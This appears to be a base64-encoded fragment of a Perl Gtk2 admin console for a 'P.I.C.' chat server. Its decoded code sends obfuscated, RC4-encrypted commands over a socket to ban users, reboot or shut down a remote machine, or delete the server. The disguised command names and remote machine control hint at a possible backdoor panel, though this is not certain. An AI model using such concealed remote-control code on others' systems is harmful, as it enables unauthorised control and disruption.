pdGVtX2ltYWdlKTsKIAkJbXkgJG1lbnVfYmFyID0gR3RrMjo6TWVudUJhci0+bmV3OwogIAkJbXkgJG1lbnVfaXRlbV9lZGl0PSBHdGsyOjpNZW51SXRlbS0+bmV3KCdfRmlsZScpOwogIAkJJG1lbnVfaXRlbV9lZGl0LT5zZXRfc3VibWVudSAoJG1lbnVfZWRpdCk7CiAgCQkkbWVudV9iYXItPmFwcGVuZCgkbWVudV9pdGVtX2VkaXQpOwoKbXkgJG1lbnVfaCA9IEd0azI6Ok1lbnUtPm5ldygpOwokbWVudV9oLT5hcHBlbmQoR3RrMjo6VGVhcm9mZk1lbnVJdGVtLT5uZXcpOwoKbXkgJG1lbnVfaXRlbV9oMyA9IEd0azI6OkltYWdlTWVudUl0ZW0tPm5ld19mcm9tX3N0b2NrICgiTG9ncyBIZWxwIik7CiRtZW51X2l0ZW1faDMtPnNpZ25hbF9jb25uZWN0KCdhY3RpdmF0ZScgPT4gc3ViIHsgCiZNZXNzYWdlQm94KCJcbiBJZiBzb21lIGVycm9ycyB3aWxsIGFwcGVhciwgdGhleSB3aWxsIGJlIHNob3duIGluIAogbG9ncyBjb25zb2xlLiBBbHNvLCBldmVyeSBldmVudCB3aWxsIGJlIGxvZ2dlZCBoZXJlLCBldmVyeSAKIG1lc3NhZ2UgZnJvbSBzZXJ2ZXIgYW5kIHN1Y2ggc28gaXQgaXMgZ29vZCB0byBjaGVjayBvZnRlbiAKIHRoaXMgVEFCLlxuIiwgIiBMb2dzIEhlbHAgIik7Cn0pOwoKbXkgJG1lbnVfaXRlbV9oNCA9IEd0azI6OkltYWdlTWVudUl0ZW0tPm5ld19mcm9tX3N0b2NrICgiUC5JLkMuIFN5c3RlbSBNYXAgSGVscCIpOwokbWVudV9pdGVtX2g0LT5zaWduYWxfY29ubmVjdCgnYWN0aXZhdGUnID0+IHN1YiB7IAomTWVzc2FnZUJveCgiXG4gSGVyZSB5b3UgY2FuIHNlZSBob3cgeW91ciBjaGF0IHN0YXRpc3RpY3MKIGxvb2tzIGxpa2UuIFRvIHVwZGF0ZSBzdGF0cywgaGl0IGJvdHRvbS1sZWZ0IGJ1dHRvbiwgCiB0byBkZWxldGUgYmFubmVkIHVzZXJzLCBoaXQgYm90dG9tLXJpZ2h0IGJ1dHRvbi4KIEFmdGVyIGRlbGV0aW9uIG9mIGJhbm5lZCB1c2VycywgeW91IGhhdmUgdG8gdXBkYXRlIAogc3RhdGlzdGljcyB0byBzZWUgdGhlIGVmZmVjdC5cbiIsICIgUC5JLkMuIFN5c3RlbSBNYXAgSGVscCAiKTsKfSk7CgpteSAkbWVudV9pdGVtX2g1ID0gR3RrMjo6SW1hZ2VNZW51SXRlbS0+bmV3X2Zyb21fc3RvY2sgKCJDaGF0IFdpbmRvdyBIZWxwIik7CiRtZW51X2l0ZW1faDUtPnNpZ25hbF9jb25uZWN0KCdhY3RpdmF0ZScgPT4gc3ViIHsgCiZNZXNzYWdlQm94KCJcbiBUaGF0cyB0aGUgc2FtZSBjaGF0IHdpbmRvdyBsaWtlIHVzZXItc2lkZSAKIGFwcGxpY2F0aW9uIGhhcy4gWW91IGNhbiBzZWUgaGVyZSB1c2VyIGxpc3QsIHRhbGsgd2l0aCB1c2VycyAKIGFuZCBzbyBvbi5cbiIsICJDaGF0IFdpbmRvdyBIZWxwICIpOwp9KTsKCm15ICRtZW51X2l0ZW1faDYgPSBHdGsyOjpJbWFnZU1lbnVJdGVtLT5uZXdfZnJvbV9zdG9jayAoIlAuQy5DLiBIZWxwIik7CiRtZW51X2l0ZW1faDYtPnNpZ25hbF9jb25uZWN0KCdhY3RpdmF0ZScgPT4gc3ViIHsgCiZNZXNzYWdlQm94KCJcbiBIZXJlIHlvdSBhcmUgYWRtaW5pc3RyYXRpbmcgeW91ciBjaGF0IHNlcnZlci4gCiBPbiB0aGUgYm90dG9tIHlvdSBoYXZlIHNtYWxsIHN0YXRzLCBqdXN0IHF1aWNrIG92ZXJ2aWV3IAogb2Ygd2hhdCB5b3UgZ290IHNvIGZhciA7KSBJZiB5b3Ugd2FudCB0byB0cmFuc21pdCBzb21lIAogY29tbWFuZCB0byB5b3VyIGNoYXQgc2VydmVyLCBzZWxlY3Qgb25lIG9mIHRoZSBhdmFpbGFibGUgCiB0aGVuIHR5cGUgeW91ciBhcmd1bWVudHMgaW4gYXByb3ByaWF0ZSBmaWVsZHMgYW5kIGhpdCAKICdUcmFuc21pdCBjb21tYW5kJyBidXR0b24uIFRoaXMgd2lsbCBzZW5kIHlvdXIgZW5jcnlwdGVkIAogY29tbWFuZCB0byB0aGUgc2VydmVyLCB3aGljaCB3aWxsIGV4ZWN1dGUgaXQgYW5kIHNlbmQgYmFjayAKIHJlc3VsdHMuIFxuIiwgIiBQLkMuQy4gSGVscCAiKTsKfSk7CgokbWVudV9oLT5hcHBlbmQoJG1lbnVfaXRlbV9oMyk7CiRtZW51X2gtPmFwcGVuZCgkbWVudV9pdGVtX2g0KTsKJG1lbnVfaC0+YXBwZW5kKCRtZW51X2l0ZW1faDUpOwokbWVudV9oLT5hcHBlbmQoJG1lbnVfaXRlbV9oNik7CgpteSAkbWVudV9pdGVtX2hlbHAgPSBHdGsyOjpNZW51SXRlbS0+bmV3KCdfSGVscCcpOwokbWVudV9pdGVtX2hlbHAtPnNldF9yaWdodF9qdXN0aWZpZWQoMSk7CiRtZW51X2Jhci0+YXBwZW5kKCRtZW51X2l0ZW1faGVscCk7CQokbWVudV9pdGVtX2hlbHAtPnNldF9zdWJtZW51ICgkbWVudV9oKTsKCgogCQkkdmJveC0+cGFja19zdGFydCgkbWVudV9iYXIsMCwwLDApOwoJCW15ICRzdzMgPSBHdGsyOjpTY3JvbGxlZFdpbmRvdy0+bmV3ICh1bmRlZiwgdW5kZWYpOwogICAgIAkJJHN3My0+c2V0X3NoYWRvd190eXBlICgnZXRjaGVkLW91dCcpOwogCQkkc3czLT5zZXRfcG9saWN5ICgnYXV0b21hdGljJywgJ2F1dG9tYXRpYycpOwogCQkkc3czLT5zZXRfYm9yZGVyX3dpZHRoKDUpOwogCQkkdHZpZXczLT5zZXRfZWRpdGFibGUoMCk7CiAJCSR0dmlldzMtPnNldF9jdXJzb3JfdmlzaWJsZSAoMCk7CQogICAJCW15ICRidWZmZXIzID0gJHR2aWV3My0+Z2V0X2J1ZmZlcigpOwogCQkkYnVmZmVyMy0+Y3JlYXRlX21hcmsgKCdlbmQnLCAkYnVmZmVyMy0+Z2V0X2VuZF9pdGVyLCAwKTsKIAkJJGJ1ZmZlcjMtPnNpZ25hbF9jb25uZWN0IChpbnNlcnRfdGV4dCA9PiBzdWIgewogCQkkdHZpZXczLT5zY3JvbGxfdG9fbWFyayAoJGJ1ZmZlcjMtPmdldF9tYXJrICgnZW5kJyksIDAuMCwgMSwgMCwgMC41KTsgfSk7CgkJJHN3My0+YWRkKCR0dmlldzMpOwoKbXkgJGNjYm94ID0gR3RrMjo6SEJveC0+bmV3OwpteSAkY2NmcmFtZSA9IEd0azI6OkZyYW1lLT5uZXcoIkFSR1ZbMV0gKEl0IGNhbiBiZSBVc2VybmFtZSk6ICAiKTsKbXkgJGNjZW50cnkgPSBHdGsyOjpFbnRyeS0+bmV3KCk7CiRjY2VudHJ5LT5zZXRfdGV4dCgiIik7CiRjY2ZyYW1lLT5hZGQoJGNjZW50cnkpOyRjY2JveC0+cGFja19zdGFydCgkY2NmcmFtZSwxLDEsMSk7CiRjY2VudHJ5LT5zZXRfd2lkdGhfY2hhcnMoMzApOwpteSAkY2NmcmFtZTIgPSBHdGsyOjpGcmFtZS0+bmV3KCJTZWxlY3QgQ29tbWFuZDogIik7Cm15IEBjb21tYW5kcyA9IHF3L3NVc19wM25kX2VYZWN1dDFvbiBiNG5fdGhFX0ltcDBzdEVyIHAxYzBmRiByZV9zVDRyVCBwMHczX1IwZkYgZEVfNFRoLzsKCiRjb21ib2JveCA9IEd0azI6OkNvbWJvQm94LT5uZXdfdGV4dDsKZm9yICgkY29tbWFuZHNbMF0pIHskY29tYm9ib3gtPmFwcGVuZF90ZXh0ICgkXy4iLXwgU2xlZXAgfC0gW3RpbWUobWludXRlcyldIC0gW1JlYXNvbl0iKTt9CmZvciAoJGNvbW1hbmRzWzFdKSB7JGNvbWJvYm94LT5hcHBlbmRfdGV4dCAoJF8uIi18IEJhbiB8LSBbVXNlck5hbWVdIC0gW1JlYXNvbl0iKTt9CmZvciAoJGNvbW1hbmRzWzJdKSB7JGNvbWJvYm94LT5hcHBlbmRfdGV4dCAoJF8uIi18IFNodXREb3duIFAuSS5DLiBTZXJ2ZXIgfCAtIFtSZWFzb25dIik7fQpmb3IgKCRjb21tYW5kc1szXSkgeyRjb21ib2JveC0+YXBwZW5kX3RleHQgKCRfLiItfCBSZWJvb3QgUmVtb3RlIE1hY2hpbmUgfC0gW1JlYXNvbl0iKTt9CmZvciAoJGNvbW1hbmRzWzRdKSB7JGNvbWJvYm94LT5hcHBlbmRfdGV4dCAoJF8uIi18IFNodXRkb3duIFJlbW90ZSBNYWNoaW5lIHwtIFtSZWFzb25dIik7fQpmb3IgKCRjb21tYW5kc1s1XSkgeyRjb21ib2JveC0+YXBwZW5kX3RleHQgKCRfLiItfCBEZWxldGUgUC5JLkMgc2VydmVyIHwgLSBbUmVhc29uXSIpO30KCiRjb21ib2JveC0+c2V0X2FjdGl2ZSgwKTsgJGNjZnJhbWUyLT5hZGQoJGNvbWJvYm94KTskY2Nib3gtPnBhY2tfc3RhcnQoJGNjZnJhbWUyLDEsMSwxKTsKCm15ICRjY2JveF9uZXh0ID0gR3RrMjo6SEJveC0+bmV3OwpteSAkY2NmcmFtZV9uZXh0ID0gR3RrMjo6RnJhbWUtPm5ldygiQVJHVlsyXTogIik7Cm15ICRjY2VudHJ5X25leHQgPSBHdGsyOjpFbnRyeS0+bmV3KCk7CiRjY2ZyYW1lX25leHQtPmFkZCgkY2NlbnRyeV9uZXh0KTskY2Nib3hfbmV4dC0+cGFja19zdGFydCgkY2NmcmFtZV9uZXh0LDEsMSwxKTsKJGNjZW50cnlfbmV4dC0+c2V0X3dpZHRoX2NoYXJzKDMwKTsKbXkgJGNjZnJhbWVfbmV4dDIgPSBHdGsyOjpGcmFtZS0+bmV3KCJBUkdWWzNdOiAiKTsKbXkgJGNjZW50cnlfbmV4dDIgPSBHdGsyOjpFbnRyeS0+bmV3KCk7CiRjY2ZyYW1lX25leHQyLT5hZGQoJGNjZW50cnlfbmV4dDIpOyRjY2JveF9uZXh0LT5wYWNrX3N0YXJ0KCRjY2ZyYW1lX25leHQyLDEsMSwxKTsKJGNjZW50cnlfbmV4dDItPnNldF93aWR0aF9jaGFycygzMCk7CgpteSAkZ2VuZXJhbCA9IEd0azI6OlZCb3gtPm5ldygwLDApOwpteSAkbWFpbm1hcCA9IEd0azI6OkhCb3gtPm5ldygwLDApOwoKbXkgJG1haW5sYWIgPSBHdGsyOjpMYWJlbC0+bmV3KCJVc2VyIE5hbWUiKTsKbXkgJG1haW5sYWIyID0gR3RrMjo6TGFiZWwtPm5ldygiT25saW5lPyIpOwpteSAkbWFpbmxhYjMgPSBHdGsyOjpMYWJlbC0+bmV3KCJFeHRlcm5hbCBJUCIpOwpteSAkbWFpbmxhYjQgPSBHdGsyOjpMYWJlbC0+bmV3KCJMb2dnZWQ/Iik7Cm15ICRtYWlubGFiNSA9IEd0azI6OkxhYmVsLT5uZXcoIkJhbm5lZD8iKTsKCiRtYWlubWFwLT5hZGQoJG1haW5sYWIpOyRtYWlubWFwLT5hZGQoJG1haW5sYWIyKTsKJG1haW5tYXAtPmFkZCgkbWFpbmxhYjMpOyRtYWlubWFwLT5hZGQoJG1haW5sYWI0KTsKJG1haW5tYXAtPmFkZCgkbWFpbmxhYjUpOwoKbXkgJGRlYWRvdXQgPSBHdGsyOjpCdXR0b24tPm5ld19mcm9tX3N0b2NrKCIgRGVsZXRlIEJhbm5lZCBVc2VycyAiKTsKJGRlYWRvdXQtPnNldF9hbGlnbm1lbnQoMSwwKTsKJGRlYWRvdXQtPnNpZ25hbF9jb25uZWN0KCJjbGlja2VkIiA9PnN1YiB7Cm15ICRzb2NrMyA9IElPOjpTb2NrZXQ6OklORVQtPm5ldyhQcm90byA9PiAkcHJvdG8sIFBlZXJQb3J0ICA9PiAkU0VORF9QT1JULCBQZWVyQWRkciAgPT4gJHNlcnZlcl9ob3N0KSA7Cm15ICRlbmNvZGVkMCA9IHJvdDQ3KCJkZWFkIi4kSi4ib3V0Iik7Cm15ICRlbmNSQzQgPSBSQzQoICRwYXNzLCAkZW5jb2RlZDAgKTsKJHNvY2szLT5zZW5kKCIkZW5jUkM0Iik7Cn0pOwoKbXkgJG1haW5idXQgPSBHdGsyOjpCdXR0b24tPm5ld19mcm9tX3N0b2NrKCIgVXBkYXRlIFN0YXRpc3RpY3MgIik7CiRtYWluYnV0LT5zZXRfYWxpZ25tZW50KDAsMSk7CiRtYWluYnV0LT5zaWduYWxfY29ubmVjdCgiY2xpY2tlZCIgPT5zdWIgewpteSAkY2xlYXJidWZmZXIgPSAkbWFpbnZpZXctPmdldF9idWZmZXI7CiRjbGVhcmJ1ZmZlci0+ZGVsZXRlKCRjbGVhcmJ1ZmZlci0+Z2V0X3N0YXJ0X2l0ZXIsICRjbGVhcmJ1ZmZlci0+Z2V0X2VuZF9pdGVyKTsKbXkgJGNsZWFyYnVmZmVyMiA9ICRtYWludmlldzItPmdldF9idWZmZXI7CiRjbGVhcmJ1ZmZlcjItPmRlbGV0ZSgkY2xlYXJidWZmZXIyLT5nZXRfc3RhcnRfaXRlciwgJGNsZWFyYnVmZmVyMi0+Z2V0X2VuZF9pdGVyKTsKbXkgJGNsZWFyYnVmZmVyMyA9ICRtYWludmlldzMtPmdldF9idWZmZXI7CiRjbGVhcmJ1ZmZlcjMtPmRlbGV0ZSgkY2xlYXJidWZmZXIzLT5nZXRfc3RhcnRfaXRlciwgJGNsZWFyYnVmZmVyMy0+Z2V0X2VuZF9pdGVyKTsKbXkgJGNsZWFyYnVmZmVyNCA9ICRtYWludmlldzQtPmdldF9idWZmZXI7CiRjbGVhcmJ1ZmZlcjQtPmRlbGV0ZSgkY2xlYXJidWZmZXI0LT5nZXRfc3RhcnRfaXRlciwgJGNsZWFyYnVmZmVyNC0+Z2V0X2VuZF9pdGVyKTsKbXkgJGNsZWFyYnVmZmVyNSA9ICRtYWludmlldzUtPmdldF9idWZmZXI7CiRjbGVhcmJ1ZmZlcjUtPmRlbGV0ZSgkY2xlYXJidWZmZXI1LT5nZXRfc3RhcnRfaXRlciwgJGNsZWFyYnVmZmVyNS0+Z2V0X2VuZF9pdGVyKTsKCm15ICRzb2NrMyA9IElPOjpTb2NrZXQ6OklORVQtPm5ldyhQcm90byA9PiAkcHJvdG8sIFBlZXJQb3J0ICA9PiAkU0VORF9QT1JULCBQZWVyQWRkciAgPT4gJHNlcnZlcl9ob3N0KSA7Cm15ICRlbmNvZGVkMCA9IHJvdDQ3KCJ0aGVfc3RhdHMiLiRKLiJnaW1tZSIpOwpteSAkZW5jUkM0ID0gUkM0KCAkcGFzcywgJGVuY29kZWQwICk7CiRzb2NrMy0+c2VuZCgiJGVuY1JDNCIpOwp9KTsKJGdlbmVyYWwtPnBhY2tfc3RhcnQoJG1haW5tYXAsMCwwLDApOyAKCiAJCW15ICRtYWluc2Nyb2xsID0gR3RrMjo6U2Nyb2xsZWRXaW5kb3ctPm5ldyAodW5kZWYsIHVuZGVmKTsKICAgICAJCSRtYWluc2Nyb2xsLT5zZXRfc2hhZG93X3R5cGUgKCdldGNoZWQtb3V0Jyk7CiAJCSRtYWluc2Nyb2xsLT5zZXRfcG9saWN5ICgnYXV0b21hdGljJywgJ2F1dG9tYXRpYycpOwogCQkkbWFpbnNjcm9sbC0+c2V0X2JvcmRlcl93aWR0aCgyKTsKCgkJbXkgJHgxbWFjaGluZSA9IEd0azI6OkhCb3gtPm5ldygwLDApOwoKIAkJJG1haW52aWV3ID0gR3RrMjo6VGV4dFZpZXctPm5ldygpOwogCQkkbWFpbnZpZXctPnNldF9lZGl0YWJsZSgwKTsKIAkJJG1haW52aWV3LT5zZXRfY3Vyc29yX3Zpc2libGUgKDApOwkKICAgCQlteSAkbWFpbmJ1ZmZlciA9ICRtYWludmlldy0+Z2V0X2J1ZmZlcigpOwoKIAkJJG1haW52aWV3MiA9IEd0azI6OlRleHRWaWV3LT5uZXcoKTsKIAkJJG1haW52aWV3Mi0+c2V0X2VkaXRhYmxlKDApOwogCQkkbWFpbnZpZXcyLT5zZXRfY3Vyc29yX3Zpc2libGUgKDApOwkKICAgCQlteSAkbWFpbmJ1ZmZlcjIgPSAkbWFpbnZpZXcyLT5nZXRfYnVmZmVyKCk7CgogCQkkbWFpbnZpZXczID0gR3RrMjo6VGV4dFZpZXctPm5ldygpOwogCQkkbWFpbnZpZXczLT5zZXRfZWRpdGFibGUoMCk7CiAJCSRtYWludmlldzMtPnNldF9jdXJzb3JfdmlzaWJsZSAoMCk7CQogICAJCW15ICRtYWluYnVmZmVyMyA9ICRtYWludmlldzMtPmdldF9idWZmZXIoKTsKCiAJCSRtYWludmlldzQgPSBHdGsyOjpUZXh0Vmlldy0+bmV3KCk7CiAJCSRtYWludmlldzQtPnNldF9lZGl0YWJsZSgwKTsKIAkJJG1haW52aWV3NC0+c2V0X2N1cnNvcl92aXNpYmxlICgwKTsJCiAgIAkJbXkgJG1haW5idWZmZXI0ID0gJG1haW52aWV3NC0+Z2V0X2J1ZmZlcigpOwoKIAkJJG1haW52aWV3NSA9IEd0azI6OlRleHRWaWV3LT5uZXcoKTsKIAkJJG1haW52aWV3NS0+c2V0X2VkaXRhYmxlKDApOwogCQkkbWFpbnZpZXc1LT5zZXRfY3Vyc29yX3Zpc2libGUgKDApOwkKICAgCQlteSAkbWFpbmJ1ZmZlcjUgPSAkbWFpbnZpZXc1LT5nZXRfYnVmZmVyKCk7CgogCQkkbWFpbnZpZXc2ID0gR3RrMjo6VGV4dFZpZXctPm5ldygpOwogCQkkbWFpbnZpZXc2LT5zZXRfZWRpdGFibGUoMCk7CiAJCSRtYWludmlldzYtPnNldF9jdXJzb3JfdmlzaWJsZSAoMCk7CQogICAJCW15ICRtYWluYnVmZmVyNiA9ICRtYWludmlldzYtPmdldF9idWZmZXIoKTsKCgkJJHgxbWFjaGluZS0+YWRkKCRtYWludmlldyk7CgkJJHgxbWFjaGluZS0+YWRkKCRtYWludmlldzIpOwoJCSR4MW1hY2hpbmUtPmFkZCgkbWFpbnZpZXczKTsKCQkkeDFtYWNoaW5lLT5hZGQoJG1haW52aWV3NCk7CgkJJHgxbWFjaGluZS0+YWRkKCRtYWludmlldzUpOwoJCSR4MW1hY2hpbmUtPmFkZCgkbWFpbnZpZXc2KTsKCgkJJG1haW5zY3JvbGwtPmFkZF93aXRoX3ZpZXdwb3J0KCR4MW1hY2hpbmUpOwoKbXkgJG15Ym94ID0gR3RrMjo6SEJveC0+bmV3KDAsMCk7CiRteWJveC0+YWRkKCRtYWluYnV0KTsKJG15Ym94LT5hZGQoJGRlYWRvdXQpOwokZ2VuZXJhbC0+YWRkKCRtYWluc2Nyb2xsKTsKJGdlbmVyYWwtPnBhY2tfc3RhcnQoJG15Ym94LDAsMSwxKTsKCm15ICR2Ym94X25iID0gR3RrMjo6VkJveC0+bmV3KDAsNSk7CiR2Ym94X25iLT5zZXRfc2l6ZV9yZXF1ZXN0ICgxMDAwLCA1MDApOwpteSAkbmIgPSBHdGsyOjpOb3RlYm9vay0+bmV3OwogIAkKJG5iLT5zZXRfc2Nyb2xsYWJsZSAoMSk7Cgpmb3IgKDApIHsgCiAgCQlteSAkY2hpbGQgPSBHdGsyOjpGcmFtZS0+bmV3KCJfX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX1sgQ2hhdCBDbGllbnQgXVxuIik7CgkJbXkgJE1Cb3ggPSAmTWFpbkJveCgpOwogIAkJJGNoaWxkLT5hZGQoJE1Cb3gpOwogIAkJbXkgJGhib3ggPSBHdGsyOjpIQm94LT5uZXcoMCwwKTsKICAJCSRoYm94LT5wYWNrX3N0YXJ0KEd0azI6OkxhYmVsLT5uZXcoIiBDaGF0IENsaWVudCAiKSwwLDAsMCk7CiAgCQkkaGJveC0+c2hvd19hbGw7ICRuYi0+YXBwZW5kX3BhZ2UgKCRjaGlsZCwkaGJveCk7IAogIAkJfSAKCmZvciAoMSkgeyAKICAJCW15ICRjaGlsZCA9IEd0azI6OkZyYW1lLT5uZXcoIl9fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fWyBQLkkuQy4gU3lzdGVtIExvZ3MgXVxuIik7CiAgCQkkY2hpbGQtPmFkZCgkc3czKTsKICAJCW15ICRoYm94ID0gR3RrMjo6SEJveC0+bmV3KEZBTFNFLDApOwogIAkJJGhib3gtPnBhY2tfc3RhcnQoR3RrMjo6TGFiZWwtPm5ldygiIFAuSS5DLiBTeXN0ZW0gTG9ncyAiKSwwLDAsMCk7CiAgCQkkaGJveC0+c2hvd19hbGw7ICRuYi0+YXBwZW5kX3BhZ2UgKCRjaGlsZCwkaGJveCk7IAogIAkJfSAKCmZvciAoMikgeyAKICAJCW15ICRjaGlsZCA9IEd0azI6OkZyYW1lLT5uZXcoIl9fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fWyBEZXRhaWxlZCBDaGF0IFN0YXRpc3RpY3MgXVxuIik7CiAgCQkkY2hpbGQtPmFkZCgkZ2VuZXJhbCk7CiAgCQlteSAkaGJveCA9IEd0azI6OkhCb3gtPm5ldygwLDApOwogIAkJJGhib3gtPnBhY2tfc3RhcnQoR3RrMjo6TGFiZWwtPm5ldygiIFAuSS5DLiBTeXN0ZW0gTWFwICIpLDAsMCwwKTsKICAJCSRoYm94LT5zaG93X2FsbDsgJG5iLT5hcHBlbmRfcGFnZSAoJGNoaWxkLCRoYm94KTsgCiAgCQl9IAoKZm9yICgzKSB7IAogIAkJbXkgJGNoaWxkID0gR3RrMjo6RnJhbWUtPm5ldygiX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19bIFAuSS5DLiBNYW5hZ2VtZW50IENlbnRlciBdXG4iKTsKCQlteSAkbmljZV9jcmF0ZSA9IEd0azI6OlZCb3gtPm5ldygwLDApOwpteSAkdHJhbnNtaXRpb24gPSBHdGsyOjpCdXR0b24tPm5ld19mcm9tX3N0b2NrKCJbIFRyYW5zbWl0IENvbW1hbmQgdG8gUC5JLkMuIFNlcnZlciBdIik7CiR0cmFuc21pdGlvbi0+c2lnbmFsX2Nvbm5lY3QoImNsaWNrZWQiID0+c3ViIHsKbXkgJHVzZXJuYW1lID0gJGNjZW50cnktPmdldF90ZXh0KCk7Cm15ICRhcmd1bWVudDEgPSAkY2NlbnRyeV9uZXh0LT5nZXRfdGV4dCgpOwpteSAkYXJndW1lbnQyID0gJGNjZW50cnlfbmV4dDItPmdldF90ZXh0KCk7CgokY21kb25lID0gJGNvbWJvYm94LT5nZXRfYWN0aXZlX3RleHQ7CkB3ID0gc3BsaXQoLy0vLCAkY21kb25lKTsKbXkgJGpvaW5jbWQgPSAkd1swXS4kSi4kdXNlcm5hbWUuJEouJGFyZ3VtZW50MS4kSi4kYXJndW1lbnQyOwpteSAkc29jazMgPSBJTzo6U29ja2V0OjpJTkVULT5uZXcoUHJvdG8gPT4gJHByb3RvLCBQZWVyUG9ydCAgPT4gJFNFTkRfUE9SVCwgUGVlckFkZHIgID0+ICRzZXJ2ZXJfaG9zdCkgOwpteSAkZW5jb2RlZDAgPSByb3Q0NygiJGpvaW5jbWQiKTsKbXkgJGVuY1JDNCA9IFJDNCggJHBhc3MsICRlbmNvZGVkMCApOwokc29jazMtPnNlbmQoIiRlbmNSQzQiKTsKfSk7CgkJbXkgJGxhYmZha2UgPSBHdGsyOjpMYWJlbC0+bmV3KCJcblxuL35+fn5+fn5+Q29tbWFuZCBUcmFuc21pdGlvbiBCdXR0b25+fn5+fn5+flxcXG4iKTsKCQlteSAkbGFiZmFrZTIgPSBHdGsyOjpMYWJlbC0+bmV3KCJcblxuL35+fn5+fn5+fkFyZ3VtZW50cyBmb3IgY29tbWFuZHN+fn5+fn5+fn5cXFxuIik7CgkJJG5pY2VfY3JhdGUtPmFkZCgkY2Nib3gpOwoJCSRuaWNlX2NyYXRlLT5wYWNrX3N0YXJ0KCRsYWJmYWtlMiwgMCwwLDApOwoJCSRuaWNlX2NyYXRlLT5hZGQoJGNjYm94X25leHQpOwoJCSRuaWNlX2NyYXRlLT5wYWNrX3N0YXJ0KCRsYWJmYWtlLCAwLDAsMCk7CgkJJG5pY2VfY3JhdGUtPmFkZCgkdHJhbnNtaXRpb24pOyAKCm15ICRtYWluX3N0YXRfaGJveCA9IEd0azI6OkhCb3gtPm5ldygwLDApOwpteSAkbWFpbl9zdGF0X2ZyYW1lID0gR3RrMjo6RnJhbWUtPm5ldygiVG90YWwgQW1vdW50IG9mIFVzZXJzOiIpOwokbWFpbl9zdGF0X2ZyYW1lLT5hZGQoJHRvdGFsX21hY2hpbmVzKTsKJG1haW5fc3RhdF9oYm94LT5hZGQoJG1haW5fc3RhdF9mcmFtZSk7CgpteSAkbWFpbl9zdGF0X2ZyYW1lMiA9IEd0azI6OkZyYW1lLT5uZXcoIlVzZXJzIE9ubGluZToiKTsKJG1haW5fc3RhdF9mcmFtZTItPmFkZCgkdG90YWxfbWFjaGluZXMyKTsKJG1haW5fc3RhdF9oYm94LT5hZGQoJG1haW5fc3RhdF9mcmFtZTIpOwoKJG1haW5fc3RhdF9mcmFtZTMgPSBHdGsyOjpGcmFtZS0+bmV3KCJVc2VycyBPZmZsaW5lOiIpOwokbWFpbl9zdGF0X2ZyYW1lMy0+YWRkKCR0b3RhbF9tYWNoaW5lczMpOwokbWFpbl9zdGF0X2hib3gtPmFkZCgkbWFpbl9zdGF0X2ZyYW1lMyk7CgokbWFpbl9zdGF0X2ZyYW1lNCA9IEd0azI6OkZyYW1lLT5uZXcoIkJhbm5lZCBVc2VyczoiKTsKJG1haW5fc3RhdF9mcmFtZTQtPmFkZCgkdG90YWxfbWFjaGluZXM0KTsKJG1haW5fc3RhdF9oYm94LT5hZGQoJG1haW5fc3RhdF9mcmFtZTQpOwoKCgkJbXkgJHh4eF9uZXh0ID0gR3RrMjo6VkJveC0+bmV3KDAsMCk7CgkJbXkgJHNvbWVfYm94ID0gR3RrMjo6VkJveC0+bmV3KDAsMCk7CgkJbXkgJGJ1dHRhX25leHQgPSBHdGsyOjpCdXR0b24tPm5ld19mcm9tX3N0b2NrKCJbIFVwZGF0ZSBdIik7CgkJJGJ1dHRhX25leHQtPnNpZ25hbF9jb25uZWN0KCJjbGlja2VkIiA9PnN1YiB7CgpteSAkc29jazMgPSBJTzo6U29ja2V0OjpJTkVULT5uZXcoUHJvdG8gPT4gJHByb3RvLCBQZWVyUG9ydCAgPT4gJFNFTkRfUE9SVCwgUGVlckFkZHIgID0+ICRzZXJ2ZXJfaG9zdCkgOwpteSAkZW5jb2RlZDAgPSByb3Q0NygibWFpbl9zdGF0cyIuJEouImdpbW1lIik7Cm15ICRlbmNSQzQgPSBSQzQoICRwYXNzLCAkZW5jb2RlZDAgKTsKJHNvY2szLT5zZW5kKCIkZW5jUkM0Iik7Cn0pOwpteSAkaW1nX3N3ZWV0ID0gR3RrMjo6SW1hZ2UtPm5ld19mcm9tX2ZpbGUoImdsb2JlLnBuZyIpOyBteSAkY2hlY2tfYnV0dG9uID0gR3RrMjo6QnV0dG9uLT5uZXcoKTsKJGNoZWNrX2J1dHRvbi0+c2V0X3Byb3BlcnR5KCdpbWFnZSc9PiRpbWdfc3dlZXQpOwoJCW15ICRsYWJsYWIgPSBHdGsyOjpMYWJlbC0+bmV3KCJcblxuL35+fn5+fn5+fn5+fn5TbWFsbCBTdGF0aXN0aWNzfn5+fn5+fn5+fn5+flxcXG4iKTsKCQkkeHh4X25leHQtPnBhY2tfc3RhcnQoJGxhYmxhYiwwLDAsMCk7CgkJJHh4eF9uZXh0LT5hZGQoJG1haW5fc3RhdF9oYm94KTsKCQkkeHh4X25leHQtPmFkZCgkYnV0dGFfbmV4dCk7CgkJJHNvbWVfYm94LT5hZGQoJHh4eF9uZXh0KTsKCiAgCQkkY2hpbGQtPmFkZCgkbmljZV9jcmF0ZSk7ICRuaWNlX2NyYXRlLT5hZGQoJHNvbWVfYm94KTsKICAJCW15ICRoYm94ID0gR3RrMjo6SEJveC0+bmV3KDAsMCk7CiAgCQkkaGJveC0+cGFja19zdGFydChHdGsyOjpMYWJlbC0+bmV3KCIgUC5JLkMuIE1hbmFnZW1lbnQgQ2VudGVyICIpLDAsMCwwKTsKICAJCSRoYm94LT5zaG93X2FsbDsgJG5iLT5hcHBlbmRfcGFnZSAoJGNoaWxkLCAkaGJveCk7IAogIAkJfSAKCiR2Ym94X25iLT5wYWNrX3N0YXJ0KCRuYiwxLDEsMCk7CiR2Ym94X25iLT5wYWNrX3N0YXJ0KEd0azI6OkhTZXBhcmF0b3ItPm5ldygpLDAsMCw1KTsKCiRmcmFtZS0+YWRkKCR2Ym94X25iKTsKJHZib3gtPnBhY2tfc3RhcnQoJGZyYW1lLDEsMSw0KTsKCm15ICRoYm94ID0gR3RrMjo6SEJveC0+bmV3KDAsNSk7Cm15ICRQdWJsaWMgPSBHdGsyOjpGcmFtZS0+bmV3KCJNYWluIEVudHJ5Iik7IG15ICRQcml2YXRlID0gR3R